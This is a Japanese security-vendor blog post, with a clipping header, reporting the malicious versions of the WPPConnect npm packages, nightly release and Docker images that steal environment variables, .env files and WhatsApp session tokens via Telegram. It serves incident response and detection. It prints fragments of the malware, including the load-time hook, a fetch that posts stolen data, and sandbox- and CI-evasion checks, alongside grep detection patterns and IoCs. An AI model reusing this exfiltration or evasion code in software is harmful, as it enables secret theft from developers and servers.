---
title: GMO Flatt Security Blog
source: https://blog.flatt.tech/entry/wppconnect_compromise?utm_source=feed
source_host: blog.flatt.tech
clip_date: 2026-11-19T13:28:35+08:00
trace_id: 06f85501-6312-4ee4-b59e-514f541f58c3
content_hash: 0e104fb3e6fc8dfaecfa24e334d4dc8e465c11cf1b7830537444438ca89f468d
status: synced
tags: []
series: null
feed_source: GMO Flatt Security
ai_summary: null
ai_summary_style: null
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 41d75244-d011-81f0-8d5c-d081419a6663
ioc:
  cves: []
  cwes: []
  hashes:
    - 06158b832fb2aeb5482202c944bc8f23d59f5cf35c0dc66e926c2e395e5673a0
    - 56a546a38f6e59509f627168c8d67f9c87fd487babf3ad91f375fe99a235c4c7
    - 7c882ee934a5663a107b5f5a0382bfd8b1fb95150cd21ab35cd8ff9cea70d1f8
    - a8fd315c910cf0d0e84e7a642c0fd70b8e4ca20673ba0cba1f8b69392c944f2d
    - baba813d6f2b4fe2328d9974a1c92d7bafc04591056a9a9d5c4c4d09c49b72d3
    - cba29bc582908603cb5e96a627e0bcc09363e9063a25f03d009f885bc69f69e0
    - cc01ce839afeaf865cfeff2e020288f721c46941e14a4e42b0f88e554c7f6aeb
    - cefc9ea30124812d8c417b216e26f4c880a1726dd5466584f2fe32500323986f
    - e1209af858b337c6ce89377552ac04c03778a6ba05e5831f41e97c4c7c917f22
    - ea9f2913ecb46073f5fb54b1a120042209b6cb7b54955ec60aedbaa72093e79d
    - f20fb59569ffffce43712d5daeb69e02b970bc9747b37537e065504e800a2cd2
    - f2dd03a8368c4dcc74795a121f1ea3da82a4bafee2814d57af29f4d18ad9d427
    - f33c4385218ecc302f02222e5e309261dbfc86f21515e0f0dd279312709a63af
  domains:
    - api.ipify.org
    - api.telegram.org
  tools: []
  techniques: []
---

2026年11月16日、WhatsApp Web を Node.js から操作する SDKである `@wppconnect-team/wppconnect` のnpm パッケージ 2.4.1に、悪性コードが注入されました。

注入された悪性コードは Infostealer 型マルウェアです。 `require()` や import された際(Dockerイメージではサーバー起動時)に、開発者や運用者の環境変数、`.env` などの設定ファイル、 `tokens/` 内の WhatsApp セッション情報を収集し、Telegram Bot API 経由で外部に送信します。

悪性コードが自動リリース・公開パイプライン（GitHub Actions）で動いており、npmパッケージだけでなくGitHub ReleaseやDocker Imageも侵害されていることが確認できています。

本記事は、弊社が Takumi Guard の解析基盤をベースに観測＆分析した情報を踏まえ、 日本のコミュニティに向けて、影響と対策を中心に整理するものです。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/26b44f7fefeced4b.png)

## TL;DR — 対応指針

-   `@wppconnect-team/wppconnect@2.4.1` は、アプリケーションから import / `require()` された時点で情報収集と外部送信を行います。
-   GitHub Release `nightly` はSDK import 時、npm `@wppconnect/server@2.10.82` はサーバー起動時に発火します。Docker `wppconnect/wppconnect-server` の `latest` / `main` / `2` / `2.10` / `2.10.82` / `2.10.83` は確認した amd64 digest の **全6タグが感染** しており、コンテナを起動することで発火します
-   **注入された悪性コードは infostealer です。環境変数、作業ディレクトリの `.env` / 設定ファイルと `tokens/` のセッション情報を収集し、Telegram Bot API にテキストとして送出します。**
-   影響を受けた場合、対象の環境変数にある API 鍵・クラウド鍵、設定ファイル内の秘密、 `tokens/` と `wppconnect_tokens/` の該当セッショントークンを **即座にローテーション** してください。

## はじめに

本記事の目的は事態の把握と対応の促進であり、違法行為への加担・助長を意図するものではありません。ペイロードの動作は手法の理解に必要な範囲で要約して記載しています。記述の一部には不正確な情報が含まれている可能性があります。速報性を優先していますので、ご了承ください。

## タイムライン

| 日時 (UTC) | イベント |
| --- | --- |
| 2026-11-13 21:24 | `@wppconnect-team/wppconnect@2.4.0` （正規版）が公開 |
| 2026-11-15 22:34 | 悪性コードを追加する 2 件の commit に記録された日時（改竄可能） |
| 2026-11-15 22:35 | メンテナアカウントを実行者とする release workflow が手動起動、 `v2.4.1` tag を作成 |
| 2026-11-15 23:31 | npm レジストリ上の `2.4.1` 公開時刻（provenance 付き） |
| 2026-11-16 02:37–02:38 | 検知回避を追加した亜種の commit、GitHub Release `nightly` の tarball が更新 |
| 2026-11-16 02:43–02:50 | `wppconnect-server` に同系統のコードを追加、Docker Hub の 6 タグが更新 |
| 2026-11-16 03:09 | npm `@wppconnect/server@2.10.82` が公開（ `latest` は `2.10.81` のまま） |

## 侵害の仕組み

### 初期侵入経路

悪性コードは、 `wppconnect-team/wppconnect` と `wppconnect-team/wppconnect-server` の双方のリポジトリに、メンテナのアカウント名義で直接追加されています。攻撃者がどのようにリポジトリへの書き込み手段を得たのかは確認できていません。

それぞれのリポジトリに元からあるリリース自動化がこのコードを取り込み、npm・GitHub Release・Docker Hub の 3 経路へ配布しました。 **いずれも改竄されていない正規の公開パイプラインを通っており、npm の悪性バージョンには OIDC の trusted publisher による正規の provenance が付いています。**

下表はいずれも両リポジトリに元から存在する GitHub Actions の workflow です。 人手による操作は master / main への push と `release.yml` の起動までで、そこから先は workflow が自動で実行しています。

| workflow | リポジトリ | workflow が起動する契機 | workflow が実行する処理 | 本件での結果 |
| --- | --- | --- | --- | --- |
| `release.yml` | `wppconnect-team/wppconnect` | 人手による起動（ `workflow_dispatch` ） | release-it を実行し、tag と release commit を作成する | `v2.4.1` tag が作成された |
| `publish.yml` | `wppconnect-team/wppconnect` | tag の push | OIDC trusted publisher として `npm publish` を実行する | 2.4.1 が provenance 付きで公開された |
| `nightly.yml` | `wppconnect-team/wppconnect` | master への push | `wppconnect-nightly.tgz` をビルドし、Release asset を上書きする | 検知回避を含む亜種が配布された |
| `build.yml` | `wppconnect-team/wppconnect` | 任意のブランチへの push | `npm test` を実行し、ビルド結果を `require('./dist/index.js')` で読み込む | 検知回避が入る前のコミットでは、ランナー上でもペイロードが読み込まれたと考えられます |
| `docker.yml` | `wppconnect-team/wppconnect-server` | main への push、 `v*` tag の push | イメージをビルドし、Docker Hub へ login して push する | 6 つのタグが悪性イメージに更新された |

Docker イメージは、Dockerfile が `COPY . .` → `yarn build` → `node dist/server.js` という構成のため、リポジトリに入ったソースがそのままイメージへ取り込まれます。

### Stage 1 — 読み込み時に発火

`@wppconnect-team/wppconnect` では `dist/utils/diagnostics.js` が追加され、ブラウザ制御モジュールの先頭から読み込まれます。 `postinstall` ではないため `npm install` では起動せず、アプリケーションがパッケージを読み込んだ時点で発火します。 `@wppconnect/server` 側は起動エントリ `dist/server.js` が同種のモジュールを読み込むため、npm なら `node dist/server.js` 、Docker ならコンテナ起動が発火点です。

```javascript
// dist/controllers/browser.js
require("../utils/diagnostics");
```

### Stage 2 — 収集と Telegram への送出

発火すると、ホスト情報・環境変数・設定ファイル・セッショントークンを集めて Telegram Bot API の `sendDocument` へ送ります。収集対象は次のとおりで、ファイルは各先頭 12,000 文字まで読まれます。 `~/.npmrc` や `~/.aws/credentials` を直接読む処理はありませんが、同等の秘密を下表の対象に置いていれば収集されます。

| カテゴリ | 具体的な対象 |
| --- | --- |
| 環境変数 | `process.env` のうち値が 3〜499 文字のもの。 `PATH`, `HOME` などの一般的なキーと `npm_` で始まるキーは除外。クラウド鍵や API トークンは条件を満たせば対象 |
| 設定ファイル | 作業ディレクトリ直下の `.env`, `.env.local`, `.env.production`, `config.js`, `config.json`, `ormconfig.json` |
| セッショントークン | 作業ディレクトリの `tokens/` （亜種は `wppconnect_tokens/` も）にある、名前に `.json` を含むファイル |
| 識別・構成情報 | ホスト名、ユーザー名、OS、Node のバージョン、メモリ、 `package.json` の名前と依存名、ディレクトリ内のファイル名、公開 IP |

送信は `api[.]ipify[.]org` で公開 IP を取得してから、収集結果を `text/plain` の文書として POST します。送信先は攻撃者の独自 C2 ではなく Telegram という第三者サービスで、レスポンスは読まず、応答を受けて次段を取得する処理もありません。一時ディレクトリのマーカーで送信は 24 時間に 1 回へ抑制されます。

```javascript
// dist/utils/diagnostics.js（送信先の資格情報は伏せています）
form.append('document', new Blob([text], { type: 'text/plain' }), name);
return fetch(SUPPORT.url, { method: 'POST', body: form }).catch(() => null);
```

#### 検知回避（亜種）

初回公開から数時間後、nightly と `wppconnect-team/wppconnect-server` に入った亜種では解析対策が加わりました。送出先 URL は 3 分割して base64 で隠され、実行時に復号・連結されます。加えて、CI・サンドボックスを示す環境変数、mitm を含むプロキシ、解析環境を思わせるホスト名のいずれかに該当すると何もせず終了し、通過した場合も 30 秒〜4 分弱のランダム待機を挟みます。マーカー名や見出し文字列も変更され、文字列ベースの検知をずらしています。

```typescript
// src/util/diagnostics.ts（抜粋）
if (env.CI === 'true' || env.GITHUB_ACTIONS === 'true') return true;
if (env.SANDBOX_MAIN || env.RTRACE || env.PURRCHAIN_RUN_MAC) return true; // Security research sandboxes
const proxy = env.https_proxy || env.HTTPS_PROXY || env.http_proxy || env.HTTP_PROXY;
if (proxy && String(proxy).indexOf('mitm') >= 0) return true; // MITM proxy
```

最初に npm へ公開された `@wppconnect-team/wppconnect@2.4.1` にはこのゲートがありません。CI のテストがパッケージを読み込んでいた場合、そのジョブの環境変数も送出対象になり得ます。

## 対応指針

以下は公開情報を踏まえた参考情報であり、記録として示すものです。正確性・網羅性を保証するものではなく、本指針に基づく対応の結果について筆者は一切の責任を負いません。実際の対応は各組織の判断に基づいて行ってください。

### 影響確認

lockfile と `node_modules/` に悪性バージョンが入っていたか、そのうえでアプリケーションが実際に読み込んでいたかを確認してください。インストールしただけで読み込んでいなければ発火していません。

```bash
# 依存の確認
npm ls @wppconnect-team/wppconnect
npm ls @wppconnect/server
grep -R "@wppconnect-team/wppconnect" package-lock.json pnpm-lock.yaml yarn.lock 2>/dev/null

# 配備済み Docker イメージの同定（タグ名ではなく manifest digest で突き合わせる）
docker image inspect <image> --format '{{index .RepoDigests 0}}'

# ペイロードの痕跡
ls -la "${TMPDIR:-/tmp}"/.wpp-support-diag "${TMPDIR:-/tmp}"/.wpp-diag 2>/dev/null
grep -rIlE 'api\.telegram\.org|wpp-support-diag|\.wpp-diag|WPP SUPPORT DIAG|WPP ENV|9034051102|7343578055|aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn' node_modules/
```

マーカーファイルは書き込みに失敗しても処理が続くため、存在しないことは安全の証明になりません。併せてログで `api[.]ipify[.]org` への GET と `api[.]telegram[.]org` への POST を確認してください。

### 除去

実行中のアプリケーションやコンテナを停止したうえで、検証済みのバージョンに固定し、lockfile と配備環境を作り直してください。

```bash
# ライブラリを正規版に固定
npm install @wppconnect-team/wppconnect@2.4.0 --save-exact
npm ls @wppconnect-team/wppconnect

# サーバーは digest で固定して再配備
docker pull wppconnect/wppconnect-server@sha256:7c882ee934a5663a107b5f5a0382bfd8b1fb95150cd21ab35cd8ff9cea70d1f8
```

`@wppconnect/server` の `@wppconnect-team/wppconnect` 依存指定は `^2.3.6` のため、サーバーを 2.10.81 に戻しても、新規 `npm install` で悪性版が別途解決され得ます。ライブラリの解決結果も lockfile で 2.4.0 に固定して確認してください。GitHub の後続 tag `v2.4.3` にも同じ悪性ソースが残っており、npm レジストリに 2.4.2 / 2.4.3 は掲載されていないため、tag を安全版と取り違えないでください。

### クレデンシャルのローテーション

感染が確認された、または否定しきれない端末・サーバーでは、当該環境内のあらゆるクレデンシャルのローテーションを検討してください。特に以下は優先的にローテーションすべきです。

-   環境変数に格納していた API トークン・クラウドクレデンシャル・デプロイ用シークレット
-   `.env` / `.env.local` / `.env.production` の値
-   `config.js` / `config.json` / `ormconfig.json` に含まれる認証情報（DB の資格情報を含む）
-   `tokens/` および `wppconnect_tokens/` の WhatsApp セッション（WhatsApp 側でログアウトさせ、再ペアリングしてください）
-   CI のテストやビルドがパッケージを読み込んでいた場合、そのジョブに渡していたシークレット

## 推奨：自衛手段の整備

3〜4月の Trivy・LiteLLM・Telnyx・axios・ `@bitwarden/cli` 、そして今回の WPPConnect と、多くのパッケージが連続して侵害されています。対策の方向性は前回までと同じです。

### Lifecycle script の無効化

CI/CD では以下を標準ポリシーにしてください。今回の npm 側 5 パッケージは、これだけで `npm install` 時の発火を止められます。

```bash
npm ci --ignore-scripts
```

ただし PyPI の `lightning` のように `__init__.py` 注入型は import 時に発火するため、lifecycle script の無効化では止まりません。後述の検疫期間とレジストリ側ブロックで補完してください。

### Dependency Cooldown の設定（min-release-age）

npm v11 以降では `.npmrc` に `min-release-age` を設定することで、公開から一定期間が経過していないバージョンのインストールを抑止できます。今回の悪性バージョンはいずれも数時間〜1 日でテイクダウン済であり、検疫期間を入れていた環境はインストールに至っていません。7 日推奨、急ぐ場合でも 3 日は確保してください。

```
# .npmrc
min-release-age=7
```

PyPI 側にも [pip の `--exclude-newer`](https://pip.pypa.io/en/stable/cli/pip_install/) や `uv` の `--exclude-newer` 相当の指定で同等の抑止が可能です。

### 悪意のある依存をブロック（Takumi Guard）

弊社（GMO Flatt Security）から、 [セキュアなレジストリプロキシ Takumi Guard の npm エンドポイント](https://flatt.tech/takumi/features/guard) をリリースしています。

Takumi Guard は npm（レジストリ）との間に位置するセキュリティプロキシで、悪意あるパッケージがブロックされます。 弊社で全ての新規パッケージを検査し、ブロックリストを構築しています。 PyPI / RubyGems にも対応済です。導入は registry URL の変更のみで完了し、無料で利用可能です。

```bash
# npm
npm config set registry https://npm.flatt.tech/

# yarn v1
yarn config set registry https://npm.flatt.tech

# yarn v2+
yarn config set npmRegistryServer https://npm.flatt.tech

# pnpm
pnpm config set registry https://npm.flatt.tech/
```

仮にある時点でパッケージがマルウェアと判定できずブロックできなかった場合も、後日の通知を行う仕組みもあります（本機能も無料です）。 通知のためにはメールアドレス登録が必要となりますので、下記ページよりご登録ください。

複数端末の一括セットアップや管理者への通知など、法人向け管理機能（有償）も提供しています。 ご興味のある方は [お問い合わせ](https://flatt.tech/contact) ください。

## IoCs

これらは Telegram / ipify の共有インフラも含むため、単独では感染の証拠になりません。Bot 資格情報を含む URL は伏せています。

### ハッシュ（SHA-256）

| ファイル | SHA-256 |
| --- | --- |
| `@wppconnect-team/wppconnect@2.4.1` tarball | `f2dd03a8368c4dcc74795a121f1ea3da82a4bafee2814d57af29f4d18ad9d427` |
| SDK 2.4.1 `dist/utils/diagnostics.js` | `06158b832fb2aeb5482202c944bc8f23d59f5cf35c0dc66e926c2e395e5673a0` |
| GitHub nightly tarball | `f33c4385218ecc302f02222e5e309261dbfc86f21515e0f0dd279312709a63af` |
| nightly `dist/utils/diagnostics.js` | `ea9f2913ecb46073f5fb54b1a120042209b6cb7b54955ec60aedbaa72093e79d` |
| npm server 2.10.82 tarball | `cefc9ea30124812d8c417b216e26f4c880a1726dd5466584f2fe32500323986f` |
| Server `dist/util/diagnostics.js` | `a8fd315c910cf0d0e84e7a642c0fd70b8e4ca20673ba0cba1f8b69392c944f2d` |

### ネットワーク

| 種別  | 値   | 備考  |
| --- | --- | --- |
| 送出先 URL | `https://api[.]telegram[.]org/bot[REDACTED]/sendDocument` | Bot 資格情報を伏せたパス、chat ID `7343578055` |
| IP 照会 URL | `https://api[.]ipify[.]org?format=json` | 公開 IP の取得 |
| 解析時の Telegram IP | `149[.]154[.]166[.]110` | 共有・変動可能なアドレス |

## 影響を受けたパッケージ

| パッケージ | 悪性バージョン | 安全なバージョン | 備考  |
| --- | --- | --- | --- |
| npm `@wppconnect-team/wppconnect` | `2.4.1` | `2.4.0` | 実行時の副作用 import |
| GitHub Release `nightly` | `wppconnect-nightly.tgz` （内部版 `2.4.4-alpha.0` ） | npm `2.4.0` | npm に `2.4.4-alpha.0` は未掲載。可変 asset |
| npm `@wppconnect/server` | `2.10.82` | `2.10.81` | 起動時に発火。npm `latest` は `2.10.81`; `2.10.83` は未掲載 |
| Docker `wppconnect/wppconnect-server` | `latest` / `2` / `2.10` / `2.10.83` / `main` / `2.10.82` | `2.10.81` | コンテナ起動で発火。digest は下記 |

GitHub の後続 tag `v2.4.3` にも同じ不正ソースが残っています。一方、確認時の npm レジストリには `2.4.3` は掲載されていません。 **GitHub tag を安全版と取り違えないでください。**

### Docker Hub の感染タグと digest

Docker のタグは可変であり、同じタグ名が指す実体はいつでも差し替わります。タグ名だけでは汚染版かどうかを判定できないため、digestで照合してください。

| タグ  | manifest digest（レジストリ側） | image ID / config digest（ローカル側） |
| --- | --- | --- |
| `latest` / `2` / `2.10` / `2.10.83` | `sha256:cc01ce839afeaf865cfeff2e020288f721c46941e14a4e42b0f88e554c7f6aeb` | `sha256:baba813d6f2b4fe2328d9974a1c92d7bafc04591056a9a9d5c4c4d09c49b72d3` |
| `main` | `sha256:cba29bc582908603cb5e96a627e0bcc09363e9063a25f03d009f885bc69f69e0` | `sha256:f20fb59569ffffce43712d5daeb69e02b970bc9747b37537e065504e800a2cd2` |
| `2.10.82` | `sha256:56a546a38f6e59509f627168c8d67f9c87fd487babf3ad91f375fe99a235c4c7` | `sha256:e1209af858b337c6ce89377552ac04c03778a6ba05e5831f41e97c4c7c917f22` |
